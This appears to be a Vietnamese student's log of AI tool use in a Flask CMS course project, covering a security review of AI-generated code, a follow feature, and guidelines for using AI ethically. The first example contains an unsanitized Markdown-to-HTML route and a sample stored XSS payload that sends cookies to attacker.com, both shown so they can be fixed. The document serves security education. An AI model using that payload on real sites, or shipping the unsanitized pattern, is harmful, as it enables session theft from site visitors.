# Nhật ký sử dụng AI Tool — FoodieNest CMS (Chapter 8)

Tài liệu minh họa nội dung **Buổi 39** (AI tools landscape, prompt engineering, AI code review, ranh giới đạo đức trong phát triển phần mềm).

---

## 1. Ví dụ 1 — Sinh route `add_cafe_comment` (Phát hiện lỗ hổng Stored XSS)

### Prompt gửi cho AI (GitHub Copilot / Gemini / Claude):
> "Viết một route Flask POST `/cafes/<int:cafe_id>/comments` nhận đánh giá của người dùng từ form dạng Markdown, chuyển sang HTML rồi lưu vào bảng `CafeComment`, yêu cầu người dùng phải đăng nhập."

### Code AI đề xuất ban đầu (rút gọn):
```python
@app.route("/cafes/<int:cafe_id>/comments", methods=["POST"])
@login_required
def add_cafe_comment(cafe_id):
    body_md = request.form.get("body_md")
    # LỖ HỔNG: AI gọi trực tiếp markdown() mà không sanitize!
    body_html = markdown.markdown(body_md)
    comment = CafeComment(cafe_id=cafe_id, author_id=current_user.id,
                          body_md=body_md, body_html=body_html)
    db.session.add(comment)
    db.session.commit()
    return redirect(url_for("cafe_detail", cafe_id=cafe_id))
```

### Review bảo mật thủ công (Manual Security Review - Trọng tâm CLO8):
- ⚠️ **Lỗ hổng nguy hiểm:** Mã do AI sinh ra hoàn toàn bỏ qua bước **lọc mã độc (Sanitization)**. Khi kẻ tấn công gửi:
  ```markdown
  Quán rất đẹp! <img src="invalid-image" onerror="alert('Tài khoản của bạn đã bị tấn công!')">
  <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  ```
  Nếu hệ thống render bằng `{{ comment.body_html | safe }}` trong Jinja2 template, mã JavaScript độc hại sẽ lập tức thực thi trên trình duyệt của các khách hàng khác.
- ✅ **Cách khắc phục thủ công của sinh viên:**
  1. Tạo module `markdown_utils.py` sử dụng hàm `bleach.clean(...)` với whitelist thẻ rút gọn `COMMENT_ALLOWED_TAGS` (chỉ cho phép định dạng text, loại bỏ triệt để thẻ script và header h1/h2).
  2. Bổ sung `.strip()` và validate nội dung không được để trống trước khi lưu vào DB.

---

## 2. Ví dụ 2 — Sinh quan hệ Follow & Feed bài viết theo dõi

### Prompt:
> "Tạo quan hệ self-referential many-to-many Follow trên model User trong Flask-SQLAlchemy và hàm lấy danh sách bài viết từ những người đang theo dõi."

### Đánh giá kết quả từ AI:
- ✅ AI đề xuất đúng cấu trúc bảng liên kết `Follow(follower_id, followed_id)`.
- ⚠️ **Thiếu sót:** AI không thêm ràng buộc chặn người dùng tự bấm follow chính mình (`user.id != self.id`), dẫn tới dữ liệu rác trong CSDL.
- ✅ **Đã hoàn thiện:**
  - Bổ sung điều kiện kiểm tra `if user.id == current_user.id` tại controller và method `follow()`.
  - Tối ưu truy vấn `followed_posts` bằng phép `JOIN` giữa `Follow` và `ReviewPost`.

---

## 3. Ranh giới đạo đức khi sử dụng AI trong môn học PWD301

1. **AI là trợ thủ tăng tốc (Scaffolding & Boilerplate):** Sử dụng AI để sinh khung sườn form, skeleton model, hoặc dữ liệu mẫu (`seed`). Tuyệt đối không dùng AI làm thay đồ án nếu không nắm vững bản chất kiến thức.
2. **Luôn rà soát bảo mật trước khi commit code:** Mọi đoạn code xử lý input từ người dùng (Markdown, Cookies, File Upload, SQL) đều phải được sinh viên kiểm tra kỹ lưỡng về XSS, SQLi, CSRF và IDOR.
3. **Trung thực học thuật:** Minh bạch quá trình dùng AI, ghi chép nhật ký prompt và các lỗi đã phát hiện sửa chữa (như tài liệu này) để giảng viên đánh giá đúng năng lực thực tế.
